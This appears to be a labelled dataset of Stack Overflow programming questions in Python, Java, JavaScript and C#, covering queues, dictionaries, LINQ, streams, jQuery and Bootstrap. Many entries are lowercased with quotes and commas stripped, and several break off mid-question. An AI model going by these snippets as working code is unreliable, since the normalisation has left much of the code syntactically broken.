Unfortunately .NET Core does not support DriveInfo and PerformanceCounter classes, hence the codes above do not work.

how to debug this error having to do with queues simulating a customer line   so i m given a list of customers and their arrival times  and i add them to a queue. my program is set up so that if a customer arrives  he/she is taken off the queue and put on to a second queue  and then a bunch of other stuff happens.      the employee serving time is a constant 5 minutes or 300 seconds  and the store closes at 5pm. so if someone comes in at 4:56 and no one else is on line  that person will get served and be done with even though the store closes at 5. other customers who might arrive after him though won t get served  even if they come before 5.      so the problem is  the important parts of my code only run if the first queue isn t empty. but from the list of customers i ve given  a guy comes in at 4:56pm  then another two people come in at 4:58 and 4:59 respectively  and with so at 4:59 that first queue is empty  and my important blocks of code no longer run.     just gonna leave the relevant parts of my code.    <pre><code>if (eventqueue.isempty() == false) {     if (eventqueue.peek().arrtimesecs == clock) {         if (customerqueue.isempty() == true)             eventqueue.peek().waitingtime = 0;         customerqueue.enqueue(eventqueue.dequeue());      // does stuff     } } </code></pre>   so that first if loop needs to evaluate to be true if the parts of my code where i m evaluating customers and what not can run  but when that last guy is taken off the queue  this part no longer runs. how can i fix this,java

python using braces inside list brackets  im very new to python and finding it very different to anything ive encountered before coming from the php realm.     <strong>background</strong>:    ive searched so and <a href= https://stackoverflow.com/questions/22391419/what-is-the-difference-between-curly-brace-and-square-bracket-in-python >learned that the differences between:</a>     <code>x = [] and x{}</code> is that the brackets will create a list and the curly braces is for creating a series. what i could not find however is an explination for the following    <strong>question</strong>    why does this piece of code use braces inside a list with brackets like so:    <code>context.modules[(stock  length)] = 0</code>    why the braces inside the list      and then as a  bonus help  if i may why set it to 0 (although that s probably out of scope of question)    fullcode:   <pre><code>context.modules = {}     for stock in context.stock_list:         for length in context.channels:             context.modules[(stock  length)] = 0 </code></pre>,python
create two functions to counts object properties/methods <pre><code>object.size = function(obj){ var size = 0  key =   ;    for(key in obj){       if(obj.hasownproperty(key)){         size++;       }    }   return size; } </code></pre>   this is the first function that i created. the mission is to create two functions  one counts properties only and the other one counts properties and methods. (limit the counting to the original objec  also i need to add the functions to the object prototype so that each object i create has the two functions available automatically as a property.)    so how do i do the second function  (and could you please take a look at my first one and see if i did anything wrong in my first function ) thank you very much!,javascript

do python dictionaries have all memory freed when reassigned   working in python. i have a function that reads from a queue and creates a dictionary based on some of the xml tags in the record read from the queue  and returns this dictionary. i call this function in a loop forever. the dictionary gets reassigned each time. does the memory previously used by the dictionary get freed at each reassignment  or does it get orphaned and eventually cause memory problems    <pre><code>def readq():     qtags = {}     # omitted code to read the queue record  get xml string  domify it      qtags[ result ] =  success      qtags[ call_offer_time ] = get_node_value_by_name(audio_dom   call_offer_time )     # more omitted code to extract the rest of the tags      return qtags  while signals.sigterm_caught == false:     tags = readq()     if tags[ result ] ==  empty :         time.sleep(sleep_time)         continue     # do stuff with the tags </code></pre>   so when i reassign tags each time in that loop  will the memory used by the previous assignment get freed before being allocated by the new assignment,python

"I am looking to populate a drop down list from a viewmodel which the data comes from a database. Here is the short hand of what my project looks like:

Model

<pre><code>public partial class Model1
{
    public string FirstName { get; set; }

    public string LastName { get; set; }
}
</code></pre>

Model2   - this will be the info to populate the drop down list

<pre><code>public partial class Model2
{
   public string typeID { get; set; }

   public string typeValue { get; set; }
}
</code></pre>

These two models are then connected to a ViewModel.

ViewModel

<pre><code>public class viewModel
{
    public Model1 Model1s { get; set; }

    public Model2 Model2s { get; set; }
}
</code></pre>

I am unable to create a drop down list at this point using the viewmodel. I have combed over about 50 example on this site but i cannot get mine to work. I know the view contains something along the lines of:

<pre><code>@Html.DropDownListFor(m =&gt; m.MarketingCampaign , new SelectList(Model.MarketingCampaignType, CampaignTypeTitle, CampaignTypeId), new { id = yourElementIdIfAny, @class = yourClassNameIfAny })
</code></pre>

will be required. I am also trying to directly input the Value and Text into a field in the model so i can easily pull information from that model which is passed back to the controller instead of using this method:

<pre><code>ViewBag.DropDownList = dbContext.Model2.ToList();
</code></pre>

and retrieving that information from passing the form back and using:

<pre><code>string value = form[DropDownList].ToString()

reading in and then writing out a selected blocks of awkward text  i have a ascii file with text i need to take from it s current awkward format and create a new file containing the reformatted text.  the input file -  datafile.txt  in my example - contains a series of regularly spaced and structured blocks of text.  i need to extract each block and reformat them to fit a particular ascii interchange standard.    i know the line range for each block - in my example lines <strong>2 to 6</strong> for the first block - and taking an answer here (<a href= https://stackoverflow.com/questions/24716001/reading-in-a-text-file-in-a-set-line-range >reading in a text file in a set line range</a>) wrote:   <pre><code>filetoread = open( datafile.txt   r ) lines = filetoread.readlines() lines_pt1 = lines[2:6]  filename =  myfile.txt  f = open(filename  w ) f.write(str(lines_pt1))  f.close() </code></pre>   this works but i need to do further work to tidy the output string  removing unwanted sets of characters  including new lines  /n  and other character sets plus replace all spaces of length 5 to be of length 1.    it seems i need to work out how to do reformatting with the strings in the list but my attempts have failed so far.  looking for advice on the best way forward.    edits: example of  datafile.txt : <a href= https://drive.google.com/file/d/0b8gbo17jqucdzkhmvvzanujwdda/view usp=sharing  rel= nofollow noreferrer >https://drive.google.com/file/d/0b8gbo17jqucdzkhmvvzanujwdda/view usp=sharing</a>    example of desired output in  myfile.txt : <a href= https://drive.google.com/file/d/0b8gbo17jqucduer6rnfrwtm1dvk/view usp=sharing  rel= nofollow noreferrer >https://drive.google.com/file/d/0b8gbo17jqucduer6rnfrwtm1dvk/view usp=sharing</a>,python

"I have a class with several <code>int</code> properties: 

<pre><code>class Foo
{
    string bar {get; set;}
    int a {get; set;}
    int b {get; set;}    
    int c {get; set;}
}
</code></pre>

I have a LINQ expression I wish to use on a <code>List&lt;Foo&gt;</code>. I want to be able to use this expression to filter/select from the list by looking at any of the three properties. For example, if I were filtering by <code>a</code>: 

<pre><code>return listOfFoo.Where(f =&gt; f.a &gt;= 0).OrderBy(f =&gt; f.a).Take(5).Select(f =&gt; f.bar);
</code></pre>

However, I want to be able to do that with any of <code>f.a</code>, <code>f.b</code>, or <code>f.c</code>. Rather than re-type the LINQ expression 3 times, I'd like to have some method which would take an argument to specify which of a, b, or c I want to filter on, and then return that result. 

Is there any way to do this in C#? Nothing immediately comes to mind, but it feels like something that should be possible.

how do i get a java set to iterate in the same order every time   is there any way that i can get a java set object (not a sortedset) to iterate over its elements in the same order every time that i run the program.

empty trailing comments  do they do/mean anything   i m looking at some of the code in the android butterknife library and found this snippet <a href= https://github.com/jakewharton/butterknife/blob/master/butterknife/src/main/java/butterknife/internal/butterknifeprocessor.java#l62  rel= nofollow >here</a>:   <pre><code>  private static final list&lt;class&lt;  extends annotation&gt;&gt; listeners = arrays.aslist(//       oncheckedchanged.class  //       onclick.class  //       oneditoraction.class  //       onfocuschange.class  //       onitemclick.class  //       onitemlongclick.class  //       onitemselected.class  //       onlongclick.class  //       onpagechange.class  //       ontextchanged.class  //       ontouch.class //   ); </code></pre>   i found this a bit peculiar to have what looks like just empty comments after each line  but no comment text.  it reminded me a little of line continuation in c macros  but i have never come across this before in java.    does this actually accomplish anything / is there some convention here where this is used,java

related to javascript - reference variable  i am reading a book wrox professinal javascript for web developer. in a chapter author is explaining about different variable types - primitive and reference. for reference type variable  this is written in the book -  reference values are objects stored in memory. unlike other languages  javascript does not permit direct access of memory locations  so direct manipulation of the object’s memory space is not allowed. when you manipulate an object  you’re really working on a reference to that object rather than the actual object itself. for this reason  such values are said to be accessed by reference.  can anyone explain what it means.,javascript
combine variable with loop  i need to combine 2 variable names  but it must be in a for loop. also i need to get the variable from a php file to know how long the loop must be.    i have while loop in php file which count how many objects i have and make  $k++  for every object. after while loop i have variable what store count of objects $galak=$k-1 ... i need to make javascript something like:   <pre><code>document.getelementbyid( galak ); var i; for (i = 1; i &lt; galak; i++) {     var decimalmask.i = new inputmask(jst_mask_decimal   rdcena .i); } </code></pre>   after loop  for  there must be decimalmask1 decimalmask2 decimalmask3 etc. and rdcena1 rdcena2 rdcena3 etc.    so question is how to add variable  i  value to other variables decimalmask and rdcena !,javascript

create math function with a  dummy  variable to be evaluated later  i am trying to create a function in python which will add a bunch of math terms together which include some arbitrary variable name to be evaluated after the entire thing has been constructed. so for example   <pre><code>def transform(terms  xterm):     function=.5     step=terms     odd=1     while step&gt;0:         function+=(2/odd*np.pi)*np.sin(odd*np.pi*xterm)         odd+=2         step-=1     return function  test=transform(10 somexvariable)  print test    </code></pre>   this is a fourier series for a particular function i had to do in my mechanics class.     basically i want to  for amount of terms (say 5)  create a variable that looks like this:   <pre><code>function = .5 + (2/odd*np.pi)*np.sin(odd*np.pi*xvariable) +.......  </code></pre>   out to however many terms i want where the variable  odd  is the only number that changes.    the key and the difficulty to this problem is inserting some dummy variable i called  xvariable  so that later i can create a array like this:   <pre><code>x2 = np.arange(0 10 .05) y = transform(2 x2) </code></pre>   the result would be an array of those x values evaluated in the function i created with  transform .    i am sure i am going about this the wrong way...but i can t seem to figure out the necessary order of steps to make this work.     help please. thanks!,python

python store lines from stdin directly to list objects  in researching the answer to this question here on stackoverflow  i ve learned a lot of new things  but have so far been unable to close the deal.    my python process will be receiving one line of input via stdin  e.g.   <pre><code>[{ name : ry    age :28}  { name : bo    age :11}  { name : ed    age :99}] </code></pre>   ...and i d like to be able to store this line directly to a list object that i can then iterate over  e.g.   <pre><code>for i in list:     print i[ age ]  i[ name ] </code></pre>   ...but i just cannot get this to work  whether i use <code>sys.stdin()</code> or the <code>fileinput</code> module. for example  even when i explicitly create a list with <code>x = list(stdin.readline())</code> it ends up making each character a separate item in the list  not parsing the text in the way i want it to. anyway.. back to searching.

javascript newbie: what s the right way to apply the same behavior to multiple elements   i m taking my first adventure with javascript  and totally without my bearings.  i d like to show a thumbnail that opens a modal with a larger view of the picture (and this is really the only front end fanciness i ll need  so i m trying to keep it simple). i ve copied <a href= http://www.w3schools.com/howto/tryit.asp filename=tryhow_css_modal_img  rel= nofollow noreferrer >this</a> code from w3schools  which uses getelementbyid. it works great for the first image on the page but clicking subsequent images doesn t pop anything up.  reading around on stack overflow it sounds like that s because i m matching on the id  but each element on the page will/should have a different id (which makes sense).     i saw a post <a href= https://stackoverflow.com/questions/21569701/javascript-open-window-changed-to-modal >here</a> where the person made the ids unique by appending the element s id.  i could do something like that  but i (a) wanted to check if that s kosher and (b) then obviously the id will no longer match  so is there some different attribute i would tack on to match up my html with my styles   this must be a common problem- what s the right way to apply the same behavior to multiple elements on a page  for example i can give them     thanks!    <strong>update</strong>: based on everyone s feedback below i ve modified the code to use getelementbyclassname instead of getelementbyid- see gist here: <a href= https://gist.github.com/dianekaplan/1602a7c0a1c1ec6aa103b61d6530ff15  rel= nofollow noreferrer >https://gist.github.com/dianekaplan/1602a7c0a1c1ec6aa103b61d6530ff15</a>    if i m reading the code correctly  then the important lines for me to change are from line 115 to line 116- (to set the image info based on classname  not id)- and replacing  myimg  with popup  in the style lines 5 and 11  but clicking the first image no longer opens the modal  so i missed something.  anyone see what s wrong that i need for it to work,javascript
java arraylist printing every other number in a list  this is my code for printing the random numbers in an arraylist:   <pre><code>public void printlist() {     system.out.println( the numbers on the list:  ) ;     for (int i = 0 ; i &lt; alist.size() ; i++)     {         system.out.print( alist.get(i) +     ) ;     }     system.out.println( \n ) ;                 } </code></pre>   how would i print every other number of this same list  by using a do-while loop,java

"I specify IE in the title because my code works as intended on Chrome. Essentially I have one view called Maintenance that is used for creating, editing, and deleting. The form itself is contained in a partial view (coincidentally called _MaintenanceForm) which has it's own GET/POST methods to submit the form. <a href=https://pastebin.com/fvLjJiNY rel=nofollow noreferrer>Here is the form.</a> Sorry I had to use Pastebin instead of inline code blocks--they were making me go over the character limit.

Note that the form has id <code>#maintenanceForm</code>. Instead of using an AJAX call to submit this form I just use the jQuery function <code>$(#maintenanceForm).submit();</code> so I don't need to pass all of the fields as data. <a href=https://pastebin.com/9gcguwLg rel=nofollow noreferrer>Here is my JavaScript for the Maintenance page.</a>

I know that the <code>.submitForm</code> click function is defined twice which is redundant code but I originally had it as a separate function which was causing problems so I defined it anonymously inline instead. I can focus on cleaning up my code once I get it working in IE.

My Maintenance view is really simple, it's just a <code>&lt;div class=maintenance-form&gt;&lt;/div&gt;</code> that the MaintenanceForm partial is rendered in using the first AJAX call. <a href=https://pastebin.com/iCnK0RJE rel=nofollow noreferrer>Here are my controller methods.</a> Essentially the problem I'm running into is that in Chrome, after the MaintenanceForm POST method, the Maintenance GET method is called which re-renders the view. When the view is re-rendered, the MaintenanceForm GET and SearchTable2 methods are called again through the AJAX call. In IE, the Maintenance GET method is called but the AJAX calls are not resubmitted so the form does not refresh. As a result I need to manually refresh the pages to see the changes made.

As I said, this works exactly as I want it to in Chrome but not IE, so I know it must be some sort of IE compatibility issue, but I can't figure it out for the life of me. Thanks in advance for any help and let me know if providing more code would help!

is there a bug in the design of pipedinputstream.java or have i misunderstood its design   i have a problem related to <code>pipedinputstream</code> and <code>pipedoutputstream</code>  and i don t know if i have misunderstood the design of these classes or if there is a bug in the java code in <code>pipedinputstream.java</code>    as far as i understand <code>pipedinputstream</code> and <code>pipedoutputstream</code> implement a mechanism that can be used to create a stream between two different threads. a producer thread writes something in the <code>pipedoutputstream</code> and a consumer thread reads it in the connected <code>pipedinputstream</code>. there is an internal buffer to allow a buffered communication. by default the size of this buffer is 1024 bytes.    if the consumer thread reads the <code>pipedinputstream</code> and the buffer is empty  then the thread waits. if the producer thread writes the <code>pipedoutputstream</code> and the buffer is full  then the thread also waits.    <code>pipedinputstream</code> maintains the internal buffer  <code>pipedoutputstream</code> only uses functions declared in <code>pipedinputstream</code>.    all the fields related with the internal (circular) buffer in <code>pipedinputstream</code> (the <code>byte [] buffer</code>  the <code>int in</code> and the <code>int out</code> -as you can see in <code>pipedinputstream.java</code>) are all declared <code>protected</code>. <code>pipedinputstream</code> injects data using 2 different  <code>pipedinputstream.receive</code> functions.    all inputstreams has two read versions: <code>read()</code> and <code>read(byte []  int  int)</code>. all outputstreams has two write versions <code>write(byte b)</code> and <code>write(byte []  int  int)</code>. all have a single-byte version and a multi-byte version. <code>pipedinputstream</code> and <code>pipedoutputstream</code> have these functions.    <code>pipedoutputstream.write(byte b)</code> uses <code>pipedinputstream.receive(int b)</code> function to inject the byte in the connected <code>pipedinputstream</code>. this receive function is declared <code>protected</code> so you can overload this function and intercept any byte injection from <code>pipedoutputstream</code> to the connected <code>pipedinputstream</code>.    <code>pipedoutputstream.write(byte b[]  int offset  int len)</code> uses <code>pipedinputstream.receive(byte [] b  int offset  int len)</code> to inject an array of bytes in the connected <code>pipedinputstream</code>.     and here comes my problem: <code>pipedinputstream.receive(byte []  int  int)</code>  the multi-byte counterpart of <code>receive(int)</code>   is not declared protected as <code>receive(int)</code> is  it has the default visibility (package visibility). so you cannot overload this function and intercept multibytes injection from <code>pipedoutputstream</code> to the connected <code>pipedinputstream</code>.    <code>pipedinputstream.write(byte b[]  int offset  int len)</code> does not invoke <code>pipedinputstream.write(int b)</code>. so overloading <code>receive(int)</code> has no effect when using <code>receive(byte [] int  int)</code>.    as far as i understand  <code>pipedinputstream.receive(byte[]  int  int)</code> should be <code>protected</code> as <code>pipedinputstream.receive(int)</code> is. its declaration:    <code>synchronized void receive(byte [] b  int off  int len) throws ioexception {</code>    should be:    <code>protected synchronized void receive(byte [] b  int off  int len) throws ioexception {</code>    <code>pipereader</code> and <code>pipewriter</code> (the character version of <code>pipedinputstream</code> and <code>pipedoutputstream</code>) declare the buffer fields and the receive method with package visibility (not protected!). reader/writer (since jdk1.1) in java are newer than inputstream/outputstream (since jdk1.0).     is it a real bug in the design of <code>pipedinputstream</code>   is the <code>protected</code> visibity in <code>pipedinputstream</code> a design accident inherited from earlier java versions   or or am i completely lost .    thanks in advance.    pd: here is an example where this problem appears. this program does not compile (by the mentioned receive visibility problem). in this example i try to create a <code>pipedinputstream</code> subclass that allows the automatic extension of the buffer when needed. so  if buffer is empty and someone try to read the thread waits. but if buffer is full and someone try to write (using the connected <code>pipedoutputstream</code>) the thread does not wait  but the buffer is extended to store more bytes. consumers wait but producers don t.    i have my own functional implementations of this example  but i wanted to know if it cannot be implemented as a <code>pipedinputstream</code> subclass.   <pre><code>import java.io.ioexception;

is it possible to use too many functions in python   this kind of a broad question.    as i find myself having to write longer and longer scripts  i find that my instinct is to break everything up into bite-sized functions; however  this ultimately results in functions calling functions calling functions calling functions.... and i m wondering if i m completely thinking about this the wrong way.    here s what an abridged script might look like. sorry it s kind of contrived.   <pre><code>def simple_task_1():     return  def simple_task_2():     return  def simple_task_3():     return  def simple_task_4():     return  def complex_task_1():     simple_task_2()     simple_task_3()     simple_task_4()     return  def startup():     simple_task_1()     complex_task_1()     simple_task_4()  def finish():     # other function calls     return  def main():     startup()     finish() </code></pre>   so  is this the correct way to be using functions  is there an objective point where you can say you ve made too many function calls inside each other  should i even be making functions for tasks that only end up being done once,python

editing a datainputstream save format  so  basically i ve been writing a game and the saving uses the datainputstream and dataoutputstream however  if i edit the values in which i want saved. (say my game has an update and a new skill is added  and i want to save it) this causes errors upon trying to load the file.    the error i usually keep seeing is this   <pre><code>[5/10/14 2:29 am]: java.io.eofexception </code></pre>   is there any way around this  so i don t have to worry about corrupting everybodies save-data on the multiplayer server every-time that i want to issue an update  i could always go back to bufferedreader and bufferedwriters  but that was horribly messy.    there s got to be a way to just tack more writeint / readints on and keep going.    for those who missed the question.   <blockquote>    how can i successfully edit the variables saved and loaded througha  datainput/output stream without corrupting the older saved-files. this is being used for a multiplayer server  so anytime that i wish to update information in the users save-file i would add more variables to be saved into the file; however because this data isn t in the old saves  when it tries to load it will look for the newer variables  won t be able to find it and thus creates an error.  </blockquote>   example code(saving):   <pre><code>            fileoutputstream fileoutputstream = new fileoutputstream(file);         dataoutputstream o = new dataoutputstream(fileoutputstream);         o.writeutf(playername);         o.writeutf(playerpass);         o.writeint(playerhealth);         o.close();         fileoutputstream.close(); </code></pre>   example code (loading)   <pre><code>            fileinputstream fileinputstream = new fileinputstream(file);         datainputstream l = new datainputstream(fileinputstream);         playername = l.readutf();         string password = l.readutf();         if (!password.equals(pw)) {             return 3;         }         playerpass = password;         playerhealth = l.readint();         l.close();         fileinputstream.close(); </code></pre>   now lets say i wanted to save the int playermana to the save file in an update.    all of the save-files that don t have playermana wont be able to load due to not having the data there already; how can i work around this.,java

"First, my apologies if the title little strange, cause i'm little confused to make title for this problem.

Okay the problem is, it's possible using '\t' outside quote function on 'Console.WriteLine'. I've code like this.

<pre><code>Console.WriteLine(===============================================================================);
Console.WriteLine(| \tNo \t| \tProduct name \t| \tQty \t| \tPrice \t|);
Console.WriteLine(| \t1. \t| \tChicken Nugget \t| + qty1 + price);
Console.WriteLine(| \t2. \t| \tTempe Nugget \t| + qty2 + price);
Console.WriteLine(| \t3. \t| \tTofu Nugget \t| + qty3 + price);
Console.WriteLine(===============================================================================);
</code></pre>

So, i want to make variable (qty1, qty2, qty3, and price) parallel to column Qty and Price. It's possible?

"jquery single .click limit  i ve been building a mobile application which scans loyalty cards and checks whether the card is registered against a database. once the barcode has been scanned  it opens up an internal browser  which automatically inserts the barcode number into a text field through the url that is sent to the browser (using   search=123456  at the end of the url). then js checks whether the url has  #click_approved  in (which is present after scanning). this automatically clicks the submit button and runs the database check  thus either bringing back user information if registered  or tells the user that the card is not registered. i have got everything working  except i m having a small problem where the submit button is constantly being clicked  as if the js code is looping. i m not sure if the problem is in my js or elsewhere. any help is appreciated.    <div class= snippet  data-lang= js  data-hide= false >

javascript - prevent function from executing multiple times  i have a function which is executed on a click (or taphold) because i am working with cordova.     the problem is that a function calls on the next object from parse.com which shows its details but  for some reason  it executes the function twice or even 3 times  skipping 1 or 2 objects that have to be shown.    i want to prevent this from happening  so i already used a flag (boolean) to indicate if it was executed by setting it to true. if the flag was false  it can be executed and the flag is set to true. the other problem is that when i call the function one more time  the boolean is still set to true and the function will not be executed.    therefore i cannot initialize the flag to false inside the method  because then it will always be executed. global variable will be set to true the first time and stay true for the rest of it s  life .    i tried a second method by using a counter and making sure that if the counter reached  let s say 0  it could be executed  but then i have the same problem for setting it back to 0 when it reaches the end .. let s say the function got executed twice  i could check if the counter reaches 2 (by incrementing it every time) and set it back to 0. then when the next time it gets executed  it executes 3 times  so when the check happens if the counter reaches 2 .. it get s set back to 0 and the next execution (the 3rd one) will be executed again because the counter is 0 again.    how do i catch this or prevent this from happening     i made a basic javascript to show you what i mean:   <pre><code>window.addeventlistener( load  setup false); var counter = 0; function setup() {    for(var i = 0; i &lt; 3; i++) {        showalert();    } }  function showalert() {    if(counter == 0) {        alert( executed once );        counter++;    } else if(counter &gt; 2) //counter is bigger than 2  so it got executed more than once {        counter = 0; //reset the counter to 0    }           } </code></pre>   the goal is to prevent the function from executing more than once (in this case  the alert may not be shown more than once). it could be executed twice or even three times  or even more. how do i prevent this     thank you! i do know a bit about programming  but this is something i have never encountered so far  so i do not know how i can catch this and make sure it s executed once,javascript
"Okay so I've been trying to code something and on the form there are several buttons all within a panel. What I'm trying to do is enable any of the 64 buttons using 2 predetermined variables. The button I enable is dependent on which button was selected previously. Each button has the name:
button + # between 1-9 + letter between A-H. I determine the letter using ASCII values.

Example: button3A, button 7H, etc.

"Since upgrading to VS 2015, my team has experienced random quirky things which I'm sure are being worked out at Microsoft right now.  One pretty annoying one is that we seem to lose project references, especially after branching.  I began to work on a new branch of our solution yesterday only to find out that types were unrecognized and namespace usings were being cited as unnecessary (because they were for the types that had suddenly become unrecognized).

The references in the project did not show any icons indicating a problem with the reference, but just to see if it would work, I removed and re-added a project reference, which caused its types to be recognized once more.

This, of course, updated the project file, so I looked to see what changes had been made.  The only difference between the project that could not detect the reference and the one that now can is that the alpha characters in the GUID had been changed from lower case to upper case.  For example:

Old, broken reference:

<pre><code>&lt;ProjectReference Include=path/redacted&gt;
    &lt;Project&gt;{95d34b2e-2ceb-499e-ab9e-b644b0af710d}&lt;/Project&gt;
    &lt;Name&gt;Project.Name.Redacted&lt;/Name&gt;
&lt;/ProjectReference&gt;
</code></pre>

New, fixed reference:

<pre><code>&lt;ProjectReference Include=path/redacted&gt;
    &lt;Project&gt;{95D34B2E-2CEB-499E-AB9E-B644B0AF710D}&lt;/Project&gt;
    &lt;Name&gt;Project.Name.Redacted&lt;/Name&gt;
&lt;/ProjectReference&gt;
</code></pre>

I'm looking for the reason this is happening and how I might fix it without having to manually remove and re-add references all over the place (and without having to convert all the project file GUIDs to upper case).

I should note that these broken references are not breaking the build, and that they only show up in the Error List as IntelliSense error, not build errors.  So, the references aren't really broken, they've just broken IntelliSense (which is arguably worse?!).

"I want user to transfer data from excel files into sql using C# winform one file at a time. The excel files consist of similar column and so there might be some new columns or columns absent. Row data will vary.

For eg:

    Name City State         Name City Zip         Name City County

    In my existing SQL table I have columns-
    **Name City Population Schools**


What is the best way to insert the new excel files with similar columns names into existing SQL db. 

Thought so far -
Copy new excel file data into temporary tables and then insert into existing table. Problem is that how write c# code/sqlquery which would insert new excel data with more or less columns than existing SQL table

Please suggest.

javascript dateformat for different timezones  i m a java developer and i m used to the simpledateformat class that allows me to format any date to any format by settings a timezone.   <pre><code>date date = new date();  simpledateformat sdf = new simpledateformat( dd-mm-yyyy hh:mm:ss );  sdf.settimezone(timezone.gettimezone( america/los_angeles )); system.out.println(sdf.format(date)); // prints date in los angeles  sdf.settimezone(timezone.gettimezone( america/chicago )); system.out.println(sdf.format(date)); // prints same date in chicago </code></pre>   simpledateformat is a pretty neat solution in java but unfortunately i can t find any similar alternative in javascript.    i m extending the date prototype in <strong>javascript</strong> to do exactly the same. i have dates in unix format but i want to format them in different timezones.   <pre><code>date.prototype.format = function(format  timezone) {     // now what      return formatteddate; } </code></pre>   i m looking for a neat way to do this rather than a hack.    thanks,javascript

"In Visual Studio 2015, I'm using the NuGet package <code>Unofficial.Microsoft.VisualStudio.TextTemplating.14.0.0</code> which allows me to transform T4 templates directly from MSBuild, whenever a project is built.

In Visual Studio 2017 RTM however, this breaks the build with the following messages:

<code>An Exception was thrown while running the transformation code. The process cannot continue.  The following Exception was thrown:
System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.CodeAnalysis, Version=1.3.1.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35' or one of its dependencies. The system cannot find the file specified.

This is raised by the file <code>Unofficial.Microsoft.VisualStudio.TextTemplating.targets(396,5)</code>  which is in this package. 

My guess is that the error comes from trying to use these targets from a VS 2017 build due to mismatched environments, but I don't know how to trace the exact issue. There is no updated package yet for v15 that I can see.

How can I do T4 transforms from MSBuild that will work for VS 2017? Will there be a new package from NuGet to use at some point or is this not going to be supported anymore?

python: deleting from a dict in-place  i have a python application that performs correlation an large files. it stores those in a dict. depending on the input files  this dict can become really large  to the point where it does not fit into memory anymore. this causes the system to hang  so i want to prevent this.    my idea is that there are always correlations which are not so relevant for the later processing. these could be deleted without changing the overall result too much. i want to do this when i have not much memory left.    hence  i check for available memory periodically. if it becomes too few (say  less than 300mb)  if delete the irrelevant correlations to gain more space. that s the theory.    now for my problem: in python  you cannot delete from a dict while iterating over it. but this is exactly what i need to do  since i have to check each dict entry for relevancy before deleting.    the usual solution would be to create a copy of the dict for iteration  or to create a new dict containing only the elements that i want to preserve. however  the dict might be several gbs big and there are only a few hundred mb of free memory left. so i cannot do much copying since that may again cause the system to hang.    here i am stuck. can anyone think of a better method to achieve what i need  if in-place deletion of dict entries is absolutely not possible while iterating  maybe there is some workaround that could save me     thanks in advance!    <strong>edit</strong> -- some more information about the dict:    the keys are tuples specifying the values by which the data is correlated.    the values are dicts containing the correlated date. the keys of these dicts are always strings  the values are numbers (int or float).    i am checking for relevancy by comparing the number values in the value-dicts with certain thresholds. if the values are below the thresholds  the particular correlation can be dropped.,python

how does the java clone method work  <pre><code>public class student implements cloneable {     public student clone() {         student clonedstudent = (student) super.clone();         return clonedstudent;     } } </code></pre>   why does java return student object instead of returning object class object. as we are using super. does it mean java itself provides shallow cloning in the clone method,java

assistance with a simple code for python  basically  i m working on a python fill in the letters type of game (kind of like hangman).    the problem is i can t seem to get the program to record duplicate points.  what i mean is:    the program asks the user for a word. that word  let s say....football  is converted into a masked string (ex. <strong><em>*</em>*</strong>)    then it continually asks the user for letter inputs. let s say the user enters: f o t b a l    and then it fills out the word. for each letter that is guessed correctly  the user is awarded one point. but the problem is that for a word like football only 6 points are awarded because some of the letters are duplicates.     basically  the way i ve coded it  each time a correct letter is guessed  another point is added on top of the overall total points. is there a better way of doing this that can include the duplicate letters,python

failing to populate bootsrap row with ng-repeat  i have a bootstrap row that  has to contain tow rows to encapsulate two array values using angular js . i want to loop through an array of friends using ng-repeat and fill the rows accordingly but am failing any help  my code is here   <pre><code>&lt;div class= panel panel-default  style= height:2240px; &gt; &lt;div class= panel-body  ng-repeat= friend in fulluser.friends &gt;     &lt;div class= row  style= padding-top:40px; &gt;         &lt;div class= col-lg-6 col-sm-6 col-md-6 col-xs-6 &gt;              &lt;div class= row &gt;                 &lt;div class= col-lg-12 col-sm-12 col-md-12 col-xs-12 &gt;                     &lt;a href= user_profile.php  class= black2 &gt;                                                   &lt;span&gt;                                                           &lt;table&gt;                                                                  &lt;tr&gt;                                     &lt;td&gt;                                         &lt;img ng-src= {{friend.avatar}}  class= img-circle  style= width:100px;height:100px   alt= generic placeholder thumbnail &gt;                                     &lt;/td&gt;                                     &lt;td&gt;                                         &lt;span style= margin-bottom:0px;font-size:12px;font-weight:bold; &gt;&amp;nbsp;&amp;nbsp;{{friend.name}}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;                                         &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;friend&lt;/span&gt;                                         &lt;hr style= margin-bottom:-15px;margin-left:0px;margin-top:0px;height:8px;width:248px; &gt;&lt;/hr&gt;                                         &amp;nbsp;&lt;span style= margin-top:-10px;font-size:25px;margin-left:223px;color:#bd2532;  class= icon icon-caret-down &gt;&lt;/span&gt;                                     &lt;/td&gt;                                 &lt;/tr&gt;                              &lt;/table&gt;                          &lt;/span&gt;                     &lt;/a&gt;                  &lt;/div&gt;             &lt;/div&gt;         &lt;/div&gt;         &lt;div class= col-lg-6 col-sm-6 col-md-6 col-xs-6  ng-if= $index % 2 === 0  &gt;              &lt;div class= row &gt;                 &lt;div class= col-lg-12 col-sm-12 col-md-12 col-xs-12 &gt;                     &lt;a href= user_profile.php  class= black2 &gt;                         &lt;span&gt;                                                           &lt;table&gt;                                                                  &lt;tr&gt;                                     &lt;td&gt;                                         &lt;img ng-src= {{friend.avatar}}  class= img-circle  style= width:100px;height:100px   alt= generic placeholder thumbnail &gt;                                     &lt;/td&gt;                                     &lt;td&gt;                                         &lt;span style= margin-bottom:0px;font-size:12px;font-weight:bold; &gt;&amp;nbsp;&amp;nbsp;{{friend.name}}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;                                         &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;friend&lt;/span&gt;                                         &lt;hr style= margin-bottom:-15px;margin-left:0px;margin-top:0px;height:8px;width:248px; &gt;&lt;/hr&gt;                                         &amp;nbsp;&lt;span style= margin-top:-10px;font-size:25px;margin-left:223px;color:#bd2532;  class= icon icon-caret-down &gt;&lt;/span&gt;                                     &lt;/td&gt;                                 